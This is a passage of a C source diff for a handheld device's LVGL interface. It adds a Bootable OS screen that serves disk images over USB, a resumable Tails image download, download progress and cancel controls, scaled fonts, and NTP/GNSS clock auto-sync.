+    int n = nocsif_bootos_enumerate(s_boot_list, BOOTOS_LIST_MAX);
+    if (n <= 0) {
+        lv_obj_t *none = lv_label_create(content);
+        lv_obj_set_width(none, lv_pct(100));
+        lv_label_set_long_mode(none, LV_LABEL_LONG_WRAP);
+        nocsif_label_font_scaled(none, &nocsif_mono_12);
+        lv_obj_set_style_text_color(none, NOCSIF_ASH, 0);
+        lv_obj_set_style_pad_left(none, 26, 0);
+        lv_obj_set_style_pad_top(none, 4, 0);
+        lv_label_set_text(none, "no images yet\nadd an .iso/.img via File Share into /sd/nocsif/bootos");
+    } else {
+        lv_obj_t *list = nocsif_menu_list(content);
+        for (int i = 0; i < n; i++) {
+            lv_obj_t *row = nocsif_menu_add_row(list, NOCSIF_ICON_DRIVE, s_boot_list[i].name, NULL,
+                                                nocsif_bootos_kind_str(s_boot_list[i].kind),
+                                                NOCSIF_TAG_VALUE, false, NULL);
+            lv_obj_add_flag(row, LV_OBJ_FLAG_CLICKABLE);
+            lv_obj_add_event_cb(row, bootos_image_cb, LV_EVENT_CLICKED, (void *)(intptr_t)i);
+        }
+    }
+
+    lv_obj_t *note = lv_label_create(content);
+    lv_obj_set_width(note, lv_pct(100));
+    lv_label_set_long_mode(note, LV_LABEL_LONG_WRAP);
+    nocsif_label_font_scaled(note, &nocsif_mono_11);
+    lv_obj_set_style_text_color(note, NOCSIF_STEEL, 0);
+    lv_obj_set_style_pad_left(note, 26, 0);
+    lv_obj_set_style_pad_top(note, 10, 0);
+    lv_label_set_text(note,
+        "Serves .iso/.img read-only as a USB disk (nothing saved). Most Linux live images boot; "
+        "some ISOs (e.g. Windows) can't boot this way.");
+    return scr;
+}
+
+static void bootos_click_cb(lv_event_t *e)
+{
+    (void)e;
+    if (!nocsif_ui_require_sd()) {
+        return;                                     /* toasts "No SD card found" itself */
+    }
+    nocsif_nav_push(build_bootos_list());
+}
+
 static lv_obj_t *build_usb(void)
 {
     lv_obj_t *content;
@@ -13479,12 +16656,20 @@ static lv_obj_t *build_usb(void)
     lv_obj_add_event_cb(conn, control_timer_deleted_cb, LV_EVENT_DELETE, ct);
     usb_conn_timer_cb(ct);   /* seed from the current mode */
 
-    nocsif_band(content, "MODE");
+    nocsif_band(content, "MODE");   /* submenu first (HID -> Keymap/Run Macro), then leaves A-Z */
     lv_obj_t *modes = nocsif_menu_list(content);
-    add_mode_row(modes, NOCSIF_ICON_DRIVE, "File Share (MSC)", "/sd drive", NOCSIF_USB_MODE_MSC);
     add_hid_row(modes);                                          /* HID Keyboard -> submenu (P4.5.3b) */
     add_mode_row(modes, NOCSIF_ICON_MON,   "Console (CDC)",    "serial",    NOCSIF_USB_MODE_CDC);
     add_action_row(modes, NOCSIF_ICON_USB, "Disconnect", usb_disconnect_click_cb);
+    add_mode_row(modes, NOCSIF_ICON_DRIVE, "File Share (MSC)", "/sd drive", NOCSIF_USB_MODE_MSC);
+
+    /* Bootable OS — serve an OS image (.iso/.img) from the card to a PC as a read-only bootable disk. */
+    nocsif_band(content, "BOOTABLE OS");
+    lv_obj_t *boot = nocsif_menu_list(content);
+    lv_obj_t *brow = nocsif_menu_add_row(boot, NOCSIF_ICON_DRIVE, "Bootable OS", NULL, NULL,
+                                         NOCSIF_TAG_NONE, false, NULL);
+    lv_obj_add_flag(brow, LV_OBJ_FLAG_CLICKABLE);
+    lv_obj_add_event_cb(brow, bootos_click_cb, LV_EVENT_CLICKED, NULL);
 
     /* grab-bag batch — STORAGE: download a URL to /sd/storage over WiFi, and a full /sd file browser
      * (create folders, move, delete). Both work regardless of the USB mode (WiFi download uses the
@@ -13509,10 +16694,16 @@ static lv_obj_t *build_usb(void)
  * /sd/storage (folder auto-created), with a duplicate name getting " (1)", " (2)", … A poll timer
  * shows connecting / progress / saved-name / failure. */
 #define DL_URL_KEY "dl_url"
+/* Current Tails USB image (editable in the field — update the version from tails.net when it bumps). */
+#define NOCSIF_TAILS_IMG_URL "https://download.tails.net/tails/stable/tails-amd64-7.14/tails-amd64-7.14.img"
 static lv_obj_t *s_dl_status;
 static lv_obj_t *s_dl_spin;           /* loading spinner (visible only while downloading) */
 static lv_obj_t *s_dl_scr;            /* the Download screen root (for the on-done nav guard) */
-static bool      s_dl_nav_armed;      /* a download started here → open the storage folder when it lands */
+static lv_obj_t *s_dl_btn;            /* the Download/Cancel action button (label toggles with state) */
+static bool      s_dl_nav_armed;      /* a download started here → open the destination folder when it lands */
+static char      s_dl_dir[64] = NOCSIF_WEBDL_DIR;  /* destination for THIS download screen */
+static bool      s_dl_resume;         /* resume a prior .part (Bootable OS images) */
+static char      s_dl_url_key[16] = DL_URL_KEY;    /* NVS key the screen remembers its URL under */
 
 static void dl_status_tick(lv_timer_t *t)
 {
@@ -13522,14 +16713,24 @@ static void dl_status_tick(lv_timer_t *t)
     nocsif_webdl_state_t st = nocsif_webdl_state();
     int p = nocsif_webdl_progress();
     if (st == NOCSIF_WEBDL_RUNNING) {
-        if (p >= 0) snprintf(buf, sizeof buf, "%s %d%%", nocsif_webdl_status(), p);
-        else        snprintf(buf, sizeof buf, "%s", nocsif_webdl_status());
+        /* Show MB (and % when the size is known): a percent alone is useless on a multi-GB image where
+         * 1% can be ~18 MB — MB climbing proves it's moving. */
+        double mb = nocsif_webdl_bytes() / (1024.0 * 1024.0);
+        uint64_t full = nocsif_webdl_total_bytes();
+        if (full > 0) {
+            snprintf(buf, sizeof buf, "%s %.1f / %.0f MB (%d%%)", nocsif_webdl_status(), mb,
+                     full / (1024.0 * 1024.0), p >= 0 ? p : 0);
+        } else if (nocsif_webdl_bytes() > 0) {
+            snprintf(buf, sizeof buf, "%s %.1f MB", nocsif_webdl_status(), mb);
+        } else {
+            snprintf(buf, sizeof buf, "%s", nocsif_webdl_status());
+        }
     } else if (st == NOCSIF_WEBDL_DONE) {
         snprintf(buf, sizeof buf, "saved: %s", nocsif_webdl_saved_name());
     } else if (st == NOCSIF_WEBDL_FAILED) {
         snprintf(buf, sizeof buf, "failed: %s", nocsif_webdl_status());
     } else {
-        snprintf(buf, sizeof buf, "saves to " NOCSIF_WEBDL_DIR);
+        snprintf(buf, sizeof buf, "saves to %s", s_dl_dir);
     }
     gf_set(s_dl_status, buf);
 
@@ -13539,11 +16740,21 @@ static void dl_status_tick(lv_timer_t *t)
         else                            lv_obj_add_flag(s_dl_spin, LV_OBJ_FLAG_HIDDEN);
     }
 
+    /* The action button is "Download" when idle and "Cancel" (red) while a transfer runs. */
+    if (s_dl_btn) {
+        lv_obj_t *blbl = lv_obj_get_child(s_dl_btn, 0);
+        if (blbl) {
+            bool busy = (st == NOCSIF_WEBDL_RUNNING);
+            lv_label_set_text(blbl, busy ? "Cancel" : "Download");
+            lv_obj_set_style_text_color(blbl, busy ? lv_color_hex(0xC0392B) : NOCSIF_WHITE, 0);
+        }
+    }
+
     /* On completion of a download started here, open the storage folder (the file is now on the card).
      * Guarded so a manual navigation away isn't hijacked. */
     if (s_dl_nav_armed && st == NOCSIF_WEBDL_DONE && s_dl_scr && nocsif_nav_top() == s_dl_scr) {
         s_dl_nav_armed = false;
-        files_push(files_make_dir_screen(NOCSIF_WEBDL_DIR));
+        files_push(files_make_dir_screen(s_dl_dir));
     }
 }
 
@@ -13553,14 +16764,21 @@ static void dl_start_from(lv_obj_t *ta)
     const char *url = lv_textarea_get_text(ta);
     if (!url || !url[0]) return;
     if (!nocsif_ui_require_sd()) return;
-    nocsif_settings_set_str(DL_URL_KEY, url);    /* remember the last URL for easy editing */
+    nocsif_settings_set_str(s_dl_url_key, url);  /* remember the last URL for easy editing */
     nocsif_webdl_init();
-    nocsif_webdl_start(url);
-    s_dl_nav_armed = true;                       /* jump to the storage folder once it finishes */
+    nocsif_webdl_start_to(url, s_dl_dir, s_dl_resume);
+    s_dl_nav_armed = true;                       /* jump to the destination folder once it finishes */
     if (s_dl_status) gf_set(s_dl_status, "starting\xE2\x80\xA6");
 }
 
-static void dl_go_cb(lv_event_t *e)    { dl_start_from((lv_obj_t *)lv_event_get_user_data(e)); }
+static void dl_go_cb(lv_event_t *e)
+{
+    if (nocsif_webdl_busy()) {                 /* running -> the button is "Cancel" */
+        nocsif_webdl_cancel();
+        return;
+    }
+    dl_start_from((lv_obj_t *)lv_event_get_user_data(e));
+}
 
 static void dl_deleted_cb(lv_event_t *e)
 {
@@ -13569,49 +16787,38 @@ static void dl_deleted_cb(lv_event_t *e)
     s_dl_status = NULL;
     s_dl_spin = NULL;
     s_dl_scr = NULL;
+    s_dl_btn = NULL;
     s_dl_nav_armed = false;
 }
 
-static lv_obj_t *build_wifi_download(void)
+static lv_obj_t *build_download_screen(const char *title, const char *sub, const char *paste_hint,
+                                       const char *dir, bool resume,
+                                       const char *url_key, const char *dflt_url)
 {
     nocsif_webdl_init();
+    snprintf(s_dl_dir, sizeof s_dl_dir, "%s", dir);
+    s_dl_resume = resume;
+    snprintf(s_dl_url_key, sizeof s_dl_url_key, "%s", url_key);
 
     lv_obj_t *content;
-    lv_obj_t *scr = nocsif_screen_scaffold("Download to SD", "url " NOCSIF_NDASH " nocsif/storage", &content);
+    lv_obj_t *scr = nocsif_screen_scaffold(title, sub, &content);
     lv_obj_set_style_pad_hor(content, 26, 0);
     s_dl_scr = scr;
     s_dl_nav_armed = false;
 
-    lv_obj_t *hint = lv_label_create(content);
-    lv_label_set_text(hint, "paste a file URL " NOCSIF_NDASH " http or https");
-    lv_label_set_long_mode(hint, LV_LABEL_LONG_WRAP);
-    lv_obj_set_width(hint, lv_pct(100));
-    lv_obj_add_style(hint, &nocsif_style_font_caption, 0);
-    lv_obj_set_style_text_color(hint, NOCSIF_STEEL, 0);
-    lv_obj_set_style_pad_bottom(hint, 8, 0);
+    /* Optional one-line hint (omitted on the Bootable OS screen to make room for the URL field). */
+    if (paste_hint != NULL && paste_hint[0] != '\0') {
+        lv_obj_t *hint = lv_label_create(content);
+        lv_label_set_text(hint, paste_hint);
+        lv_label_set_long_mode(hint, LV_LABEL_LONG_WRAP);
+        lv_obj_set_width(hint, lv_pct(100));
+        lv_obj_add_style(hint, &nocsif_style_font_caption, 0);
+        lv_obj_set_style_text_color(hint, NOCSIF_STEEL, 0);
+        lv_obj_set_style_pad_bottom(hint, 8, 0);
+    }
 
-    char last[512];
-    nocsif_settings_get_str(DL_URL_KEY, last, sizeof last, "https://");
-    lv_obj_t *ta = lv_textarea_create(content);
-    lv_textarea_set_one_line(ta, true);
-    lv_textarea_set_text(ta, last);                 /* prefill with the last URL for easy editing */
-    lv_textarea_set_accepted_chars(ta,              /* URL-safe set — matches the specialized board */
-        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_/:?=&%#@~+()[]!$*;'\"<>");
-    lv_obj_set_width(ta, lv_pct(100));
-    lv_obj_set_style_bg_color(ta, NOCSIF_PIT, 0);
-    lv_obj_set_style_bg_opa(ta, LV_OPA_COVER, 0);
-    lv_obj_set_style_text_color(ta, NOCSIF_BONE, 0);
-    lv_obj_add_style(ta, &nocsif_style_row_name, 0);
-    lv_obj_set_style_border_color(ta, NOCSIF_EDGE2, 0);
-    lv_obj_set_style_border_width(ta, 1, 0);
-    lv_obj_set_style_radius(ta, 6, 0);
-    lv_obj_set_style_bg_color(ta, NOCSIF_VIOLET, LV_PART_CURSOR);
-    lv_obj_set_style_bg_opa(ta, LV_OPA_COVER, LV_PART_CURSOR);
-
-    /* Download button — pinned just above the keyboard so the keys never cover it (reference frame). */
-    nocsif_kb_action(scr, "Download", dl_go_cb, ta);
-
-    /* status row: [spinner] status-text (spinner shown only while downloading) */
+    /* status row: [spinner] status-text — placed ABOVE the URL field so it is never hidden behind the
+     * pinned Download button / keyboard (the progress % and failure reason must stay visible). */
     lv_obj_t *statrow = lv_obj_create(content);
     lv_obj_remove_style_all(statrow);
     lv_obj_set_width(statrow, lv_pct(100));
@@ -13619,7 +16826,7 @@ static lv_obj_t *build_wifi_download(void)
     lv_obj_set_flex_flow(statrow, LV_FLEX_FLOW_ROW);
     lv_obj_set_flex_align(statrow, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
     lv_obj_set_style_pad_column(statrow, 8, 0);
-    lv_obj_set_style_pad_top(statrow, 12, 0);
+    lv_obj_set_style_pad_bottom(statrow, 8, 0);
     lv_obj_clear_flag(statrow, LV_OBJ_FLAG_SCROLLABLE);
 
     s_dl_spin = lv_spinner_create(statrow);
@@ -13637,7 +16844,33 @@ static lv_obj_t *build_wifi_download(void)
     lv_obj_set_flex_grow(s_dl_status, 1);
     lv_obj_add_style(s_dl_status, &nocsif_style_font_tag_small, 0);
     lv_obj_set_style_text_color(s_dl_status, NOCSIF_STEEL, 0);
-    lv_label_set_text(s_dl_status, "saves to " NOCSIF_WEBDL_DIR);
+    {
+        char initbuf[96];
+        snprintf(initbuf, sizeof initbuf, "saves to %s", s_dl_dir);
+        lv_label_set_text(s_dl_status, initbuf);
+    }
+
+    char last[512];
+    nocsif_settings_get_str(s_dl_url_key, last, sizeof last, dflt_url);
+    lv_obj_t *ta = lv_textarea_create(content);
+    lv_textarea_set_one_line(ta, true);
+    lv_textarea_set_text(ta, last);                 /* prefill with the last URL for easy editing */
+    lv_textarea_set_accepted_chars(ta,              /* URL-safe set — matches the specialized board */
+        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_/:?=&%#@~+()[]!$*;'\"<>");
+    lv_obj_set_width(ta, lv_pct(100));
+    lv_obj_set_style_bg_color(ta, NOCSIF_PIT, 0);
+    lv_obj_set_style_bg_opa(ta, LV_OPA_COVER, 0);
+    lv_obj_set_style_text_color(ta, NOCSIF_BONE, 0);
+    lv_obj_add_style(ta, &nocsif_style_row_name, 0);
+    lv_obj_set_style_border_color(ta, NOCSIF_EDGE2, 0);
+    lv_obj_set_style_border_width(ta, 1, 0);
+    lv_obj_set_style_radius(ta, 6, 0);
+    lv_obj_set_style_bg_color(ta, NOCSIF_VIOLET, LV_PART_CURSOR);
+    lv_obj_set_style_bg_opa(ta, LV_OPA_COVER, LV_PART_CURSOR);
+
+    /* Download button — pinned just above the keyboard so the keys never cover it (reference frame).
+     * Its label toggles to "Cancel" while a download runs (dl_status_tick). */
+    s_dl_btn = nocsif_kb_action(scr, "Download", dl_go_cb, ta);
 
     nocsif_kb_attach(scr, ta, NOCSIF_KB_URL);          /* specialized URL board (no space, no comma) */
 
@@ -13645,6 +16878,24 @@ static lv_obj_t *build_wifi_download(void)
     lv_obj_add_event_cb(scr, dl_deleted_cb, LV_EVENT_DELETE, tm);
     dl_status_tick(tm);
     return scr;
+}
+
+/* Cyber > USB Gadget > Download to SD (generic URL -> /sd/nocsif/storage). */
+static lv_obj_t *build_wifi_download(void)
+{
+    return build_download_screen("Download to SD", "url " NOCSIF_NDASH " nocsif/storage",
+        "paste a file URL " NOCSIF_NDASH " http or https",
+        NOCSIF_WEBDL_DIR, false, DL_URL_KEY, "https://");
+}
+
+/* Bootable OS > Download TailsOS (Tails image -> /sd/nocsif/bootos, resumable). The field is pre-filled
+ * with the current Tails USB image and is editable (bump the version from tails.net). ~1.8 GB over WiFi
+ * is a long, one-time download; it resumes a dropped transfer when you tap Download again. */
+static lv_obj_t *build_bootos_download(void)
+{
+    /* No subtitle / hint — the status row + the editable URL field must both fit above the keyboard. */
+    return build_download_screen("Download TailsOS", "", "",
+        NOCSIF_BOOTOS_DIR, true, "boot_url", NOCSIF_TAILS_IMG_URL);
 }
 
 /* ---- P4.5.3b: HID Keyboard submenu + /sd/ducky macro file picker ------------------------------- *
@@ -13693,11 +16944,11 @@ static lv_obj_t *build_hid(void)
     usb_conn_timer_cb(ct);   /* seed from the current mode */
 
     lv_obj_t *list = nocsif_menu_list(content);
+    add_status_row(list, NOCSIF_ICON_GLOBE, "Keymap", keymap_click_cb, keymap_status_timer_cb);
     lv_obj_t *run = nocsif_menu_add_row(list, NOCSIF_ICON_AUTO, "Run Macro", NULL, NULL,
                                         NOCSIF_TAG_NONE, false, NULL);
     lv_obj_add_flag(run, LV_OBJ_FLAG_CLICKABLE);
     lv_obj_add_event_cb(run, run_macro_drill_cb, LV_EVENT_CLICKED, NULL);
-    add_status_row(list, NOCSIF_ICON_GLOBE, "Keymap", keymap_click_cb, keymap_status_timer_cb);
     return scr;
 }
 
@@ -14206,13 +17457,13 @@ static void lora_devinfo_open(float mhz, bool from_hunt)
     lv_obj_t *cat = lv_label_create(content);
     lv_label_set_long_mode(cat, LV_LABEL_LONG_WRAP);
     lv_obj_set_width(cat, lv_pct(100));
-    lv_obj_set_style_text_font(cat, &nocsif_mono_12, 0);
+    nocsif_label_font_scaled(cat, &nocsif_mono_12);
     lv_obj_set_style_text_color(cat, nocsif_accent(), 0);
     lv_label_set_text(cat, lora_band_name(mhz));
 
     s_ld_live = lv_label_create(content);
     lv_obj_set_width(s_ld_live, lv_pct(100));
-    lv_obj_set_style_text_font(s_ld_live, &nocsif_mono_12, 0);
+    nocsif_label_font_scaled(s_ld_live, &nocsif_mono_12);
     lv_obj_set_style_text_color(s_ld_live, NOCSIF_ASH, 0);
     lv_obj_set_style_pad_bottom(s_ld_live, 6, 0);
     lv_label_set_text(s_ld_live, "acquiring\xE2\x80\xA6");
@@ -14308,7 +17559,7 @@ static lv_obj_t *build_lora_omit(void)
     int n = nocsif_lora_omit_count();
     s_lom_status = lv_label_create(content);
     lv_obj_set_width(s_lom_status, lv_pct(100));
-    lv_obj_set_style_text_font(s_lom_status, &nocsif_mono_12, 0);
+    nocsif_label_font_scaled(s_lom_status, &nocsif_mono_12);
     lv_obj_set_style_text_color(s_lom_status, NOCSIF_STEEL, 0);
     { char b[56]; snprintf(b, sizeof b, "%d hidden " NOCSIF_DOT " tap to un-hide", n);
       lv_label_set_text(s_lom_status, b); }
@@ -14348,13 +17599,13 @@ static lv_obj_t *build_lora_omit(void)
         lv_obj_t *nm = lv_label_create(row);
         lv_label_set_long_mode(nm, LV_LABEL_LONG_DOT);
         lv_obj_set_width(nm, lv_pct(100));
-        lv_obj_set_style_text_font(nm, &nocsif_mono_13, 0);
+        nocsif_label_font_scaled(nm, &nocsif_mono_13);
         lv_obj_set_style_text_color(nm, NOCSIF_BONE, 0);
         { char nmb[28]; snprintf(nmb, sizeof nmb, "%.2f MHz", (double)o.mhz); lv_label_set_text(nm, nmb); }
 
         lv_obj_t *mt = lv_label_create(row);
         lv_obj_set_width(mt, lv_pct(100));
-        lv_obj_set_style_text_font(mt, &nocsif_mono_11, 0);
+        nocsif_label_font_scaled(mt, &nocsif_mono_11);
         lv_obj_set_style_text_color(mt, NOCSIF_ASH, 0);
         char sub[64];
         snprintf(sub, sizeof sub, "%s%s\xC2\xB1%.0f kHz " NOCSIF_DOT " tap to remove",
@@ -14484,7 +17735,7 @@ static void lr_edit_hi_cb(lv_event_t *e) { (void)e; s_lr_edit_which = 1; lv_obj_
 static void lora_range_box(lv_obj_t *parent, const char *title, lv_obj_t **val_out, lv_event_cb_t cb)
 {
     lv_obj_t *cap = lv_label_create(parent);
-    lv_obj_set_style_text_font(cap, &nocsif_mono_11, 0);
+    nocsif_label_font_scaled(cap, &nocsif_mono_11);
     lv_obj_set_style_text_color(cap, NOCSIF_ASH, 0);
     lv_obj_set_style_pad_top(cap, 8, 0);
     lv_label_set_text(cap, title);
@@ -14506,7 +17757,7 @@ static void lora_range_box(lv_obj_t *parent, const char *title, lv_obj_t **val_o
     lv_obj_add_event_cb(box, cb, LV_EVENT_CLICKED, NULL);
 
     lv_obj_t *v = lv_label_create(box);
-    lv_obj_set_style_text_font(v, &nocsif_mono_13, 0);
+    nocsif_label_font_scaled(v, &nocsif_mono_13);
     lv_obj_set_style_text_color(v, NOCSIF_BONE, 0);
     lv_label_set_text(v, "\xE2\x80\x94");
     if (val_out) *val_out = v;
@@ -14537,12 +17788,12 @@ static lv_obj_t *build_lora_range(void)
 
     s_lr_win_lbl = lv_label_create(content);
     lv_obj_set_width(s_lr_win_lbl, lv_pct(100));
-    lv_obj_set_style_text_font(s_lr_win_lbl, &nocsif_mono_13, 0);
+    nocsif_label_font_scaled(s_lr_win_lbl, &nocsif_mono_13);
     lv_obj_set_style_text_color(s_lr_win_lbl, NOCSIF_BONE, 0);
     lv_obj_set_style_pad_top(s_lr_win_lbl, 8, 0);
     s_lr_res_lbl = lv_label_create(content);
     lv_obj_set_width(s_lr_res_lbl, lv_pct(100));
-    lv_obj_set_style_text_font(s_lr_res_lbl, &nocsif_mono_11, 0);
+    nocsif_label_font_scaled(s_lr_res_lbl, &nocsif_mono_11);
     lv_obj_set_style_text_color(s_lr_res_lbl, NOCSIF_ASH, 0);
 
     lora_pill(content, "Apply custom window", lr_apply);
@@ -14888,6 +18139,17 @@ static void lora_alert_tick(void)
         return;
     }
 
+    /* A download (webdl: OS image / URL over WiFi) claims the card and needs the lean WiFi RX's scarce
+     * contiguous int-DMA. A concurrent LoRa band survey fragments that pool (measured: int-DMA largest
+     * ~4 KB) AND contends for the shared SPI3 bus with the card writes, throttling the transfer to a
+     * crawl (~50 KB/s). Stand down while a download runs; re-arm when it finishes. */
+    if (nocsif_webdl_busy()) {
+        if (nocsif_lora_surveying()) nocsif_lora_set_survey(false);
+        s_lal_sampling = false;
+        s_lal_next_us  = 0;
+        return;
+    }
+
     if (!nocsif_settings_get_i32("la_en", 0)) {              /* disarmed: release the survey if we own it */
         if (s_lal_sampling) {
             bool fg = nocsif_lora_carrier_active() || nocsif_lora_hunting()
@@ -15223,7 +18485,7 @@ static lv_obj_t *build_lora_carrier(void)
     s_cw_status = lv_label_create(content);
     lv_label_set_long_mode(s_cw_status, LV_LABEL_LONG_WRAP);
     lv_obj_set_width(s_cw_status, lv_pct(100));
-    lv_obj_set_style_text_font(s_cw_status, &nocsif_mono_12, 0);
+    nocsif_label_font_scaled(s_cw_status, &nocsif_mono_12);
     lv_obj_set_style_text_color(s_cw_status, NOCSIF_STEEL, 0);
     lv_obj_set_style_pad_top(s_cw_status, 8, 0);
     lv_label_set_text(s_cw_status, "\xE2\x80\xA6");
@@ -15938,7 +19200,7 @@ static lv_obj_t *build_sgcap_record(void)
     lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLL_ELASTIC | LV_OBJ_FLAG_SCROLL_MOMENTUM);
 
     s_rec_rssi_lbl = lv_label_create(content);
-    lv_obj_set_style_text_font(s_rec_rssi_lbl, &nocsif_serif_26, 0);
+    nocsif_label_font_scaled(s_rec_rssi_lbl, &nocsif_serif_26);
     lv_obj_set_style_text_color(s_rec_rssi_lbl, NOCSIF_BONE, 0);
     lv_obj_set_style_pad_top(s_rec_rssi_lbl, 6, 0);
     lv_label_set_text(s_rec_rssi_lbl, "-- dBm");
@@ -17160,7 +20422,7 @@ static void build_time_readout(lv_obj_t *content)
 
     lv_obj_t *clk = lv_label_create(box);
     lv_label_set_text(clk, nocsif_rtc_clock_str());
-    lv_obj_set_style_text_font(clk, &nocsif_mono_18, 0);
+    nocsif_label_font_scaled(clk, &nocsif_mono_18);
     lv_obj_set_style_text_color(clk, NOCSIF_BONE, 0);
     nocsif_nav_register_live_label(clk, nocsif_rtc_clock_str);
 
@@ -17255,7 +20517,7 @@ static void sw_add_lap_row(int idx)   /* 0-based */
     snprintf(line, sizeof line, "Lap %d   %s%s", idx + 1, hms, cs);
     lv_obj_t *l = lv_label_create(s_sw_laplist);
     lv_label_set_text(l, line);
-    lv_obj_set_style_text_font(l, &nocsif_mono_14, 0);
+    nocsif_label_font_scaled(l, &nocsif_mono_14);
     lv_obj_set_style_text_color(l, NOCSIF_BONE, 0);
     lv_obj_set_style_pad_ver(l, 3, 0);
 }
@@ -17310,7 +20572,7 @@ static lv_obj_t *build_timers_stopwatch(void)
     lv_obj_set_style_text_font(s_sw_hero, &nocsif_num_48, 0);
     lv_obj_set_style_text_color(s_sw_hero, NOCSIF_WHITE, 0);
     s_sw_cs = lv_label_create(hero);
-    lv_obj_set_style_text_font(s_sw_cs, &nocsif_mono_18, 0);
+    nocsif_label_font_scaled(s_sw_cs, &nocsif_mono_18);
     lv_obj_set_style_text_color(s_sw_cs, NOCSIF_STEEL, 0);
     lv_obj_set_style_pad_bottom(s_sw_cs, 6, 0);
 
@@ -17835,14 +21097,14 @@ static void wc_add_home_row(lv_obj_t *parent)   /* the raised readout: the HOME 
     lv_obj_clear_flag(lc, LV_OBJ_FLAG_SCROLLABLE);
     lv_obj_t *hc = lv_label_create(lc);
     lv_label_set_text(hc, "HOME");
-    lv_obj_set_style_text_font(hc, &nocsif_mono_11, 0);
+    nocsif_label_font_scaled(hc, &nocsif_mono_11);
     lv_obj_set_style_text_color(hc, NOCSIF_STEEL, 0);
     s_wc_home_name = lv_label_create(lc);
     lv_obj_add_style(s_wc_home_name, &nocsif_style_row_name, 0);
     lv_obj_set_style_text_color(s_wc_home_name, NOCSIF_VIOLET, 0);
 
     s_wc_home_time = lv_label_create(row);
-    lv_obj_set_style_text_font(s_wc_home_time, &nocsif_mono_18, 0);
+    nocsif_label_font_scaled(s_wc_home_time, &nocsif_mono_18);
     lv_obj_set_style_text_color(s_wc_home_time, NOCSIF_WHITE, 0);
 }
 static void wc_add_city_row(lv_obj_t *parent, int ix)
@@ -17874,7 +21136,7 @@ static void wc_add_city_row(lv_obj_t *parent, int ix)
     lv_obj_add_style(nm, &nocsif_style_row_name, 0);
     lv_obj_set_style_text_color(nm, NOCSIF_BONE, 0);
     lv_obj_t *tm = lv_label_create(top);
-    lv_obj_set_style_text_font(tm, &nocsif_mono_18, 0);
+    nocsif_label_font_scaled(tm, &nocsif_mono_18);
     lv_obj_set_style_text_color(tm, NOCSIF_WHITE, 0);
 
     lv_obj_t *cap = lv_label_create(row);
@@ -17896,16 +21158,14 @@ static lv_obj_t *build_timers_world(void)
     return scr;
 }
 
-/* ==== M8-P3: Sync Clock from GNSS (gnss.syncclock) ==== *
- * Sets the PCF85063A RTC from the GNSS UTC time. The watch keeps a
- * HOME-local wall-clock, matching the World-Clock model — the RTC holds
- * home's local time, and other cities derive from it — so this writes
- * UTC + HOME.off_min. HOME is the World Clock's own persisted tz_home
- * city, reused here so there's only one place to pick your zone. "Sync
- * now" is manual, since a fix is a clock sync but the clock shouldn't
- * silently change; it needs a valid fix so the time is trustworthy.
- * Placed after the World Clock so k_cities/wc_home_ix are already in
- * scope. Live streaming is on while the screen is open, stopped on exit. */
+/* ==== M8-P3 — Sync Clock from GNSS (gnss.syncclock) ========================= *
+ * Sets the PCF85063A RTC from the GNSS UTC time. The watch keeps HOME-local wall-clock (the same
+ * World-Clock model: RTC = home's local time, other cities derive from it), so we write
+ * UTC + HOME.off_min. HOME is the World Clock's persisted `tz_home` city (reused here — one place to
+ * pick your zone). This screen is the manual "Sync now" + status view; the clock ALSO auto-syncs in the
+ * background from whichever source is up — NTP over WiFi or a GNSS fix — via time_auto_sync_tick() on the
+ * header tick (NTP takes precedence). Placed after the World Clock so k_cities/wc_home_ix are in scope.
+ * Live streaming is on while the screen is open (stopped on exit). */
 
 /* Howard Hinnant's civil<->days conversion (proleptic Gregorian, day 0 is 1970-01-01) — exact integer date math for the UTC-to-local shift across day/month/year boundaries, with no libc timegm/TZ dependency. m runs 1-12. */
 static long sc_days_from_civil(int y, int m, int d)
@@ -17991,6 +21251,57 @@ static bool sc_apply(const nocsif_gnss_fix_t *f)
     lt.tm_hour = (int)(tod / 3600); lt.tm_min = (int)((tod % 3600) / 60); lt.tm_sec = (int)(tod % 60);
     lt.tm_isdst = -1;
     return nocsif_rtc_set(&lt) == ESP_OK;
+}
+
+/* The UTC-fields twin of sc_apply (the NTP path's system clock is UTC): convert to HOME-local, DST-aware,
+ * and write the RTC. Reuses the same civil-date + US-DST helpers as the GNSS path. */
+static bool sc_apply_utc(int Y, int M, int D, int hh, int mm, int ss)
+{
+    if (Y < 2016) return false;
+    int64_t utc = (int64_t)sc_days_from_civil(Y, M, D) * 86400 + (int64_t)hh * 3600 + mm * 60 + ss;
+    int home = wc_home_ix();
+    int off = k_cities[home].off_min;
+    if (k_cities[home].dst == CITY_DST_US && sc_us_dst_active(utc, Y, (int64_t)off * 60)) off += 60;
+    int64_t secs = utc + (int64_t)off * 60;
+    int64_t z = secs / 86400, tod = secs % 86400;
+    if (tod < 0) { tod += 86400; z -= 1; }
+    int y2, m2, d2; sc_civil_from_days((long)z, &y2, &m2, &d2);
+    struct tm lt; memset(&lt, 0, sizeof lt);
+    lt.tm_year = y2 - 1900; lt.tm_mon = m2 - 1; lt.tm_mday = d2;
+    lt.tm_hour = (int)(tod / 3600); lt.tm_min = (int)((tod % 3600) / 60); lt.tm_sec = (int)(tod % 60);
+    lt.tm_isdst = -1;
+    return nocsif_rtc_set(&lt) == ESP_OK;
+}
+
+/* Auto clock sync from whichever source is up (operator ask): NTP (WiFi) mirrors to the RTC on each sync
+ * and takes precedence; a fresh GNSS fix backfills only when nothing has synced for ~10 min, so GNSS never
+ * fights NTP. Runs on the header tick (LVGL task, where nocsif_rtc_set already runs); the NTP check is a
+ * counter compare and the GNSS read is rate-gated, so this is cheap. */
+static void time_auto_sync_tick(void)
+{
+    static uint8_t  divi;
+    if (divi++ & 7) return;                        /* ~every 4 s is plenty for a wall clock */
+    static uint32_t seen_ntp;
+    static uint32_t last_ms;                        /* lv_tick of the last good sync */
+    static bool     have_last;
+
+    uint32_t g = nocsif_wifi_ntp_gen();
+    if (g != seen_ntp) {                            /* NTP set the system clock -> mirror it to the RTC */
+        seen_ntp = g;
+        time_t now = time(NULL);
+        if (now > (time_t)1700000000) {             /* sanity: system clock actually set (> 2023-11) */
+            struct tm u; gmtime_r(&now, &u);
